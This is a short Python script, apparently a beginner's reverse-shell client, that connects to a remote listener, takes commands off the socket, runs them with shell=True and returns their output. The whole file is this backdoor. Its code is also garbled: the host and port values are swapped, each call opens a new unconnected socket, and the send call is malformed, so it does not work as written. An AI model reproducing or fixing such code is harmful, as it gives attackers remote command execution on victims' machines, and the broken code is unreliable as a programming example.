from ctypes.wintypes import INT
import socket
import subprocess


# SETTING UP IP/Sockets
REMOTE_PORT = '127.0.0.1'

new_string = bytearray(REMOTE_PORT, "ascii")
ip_receiver = new_string
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


REMOTE_HOST = 8081
client = socket.socket()

# INITIALIZING CONNECTION
print("[-] Connection Initializing...")
socket.socket().connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection Initiated!")

# RUNTIME LOOP
while True:
    print("[-] Awaiting Commands...")
    command = socket.socket().recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True,
                          stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending Response...")
    socket.socket().send(output=output_error)
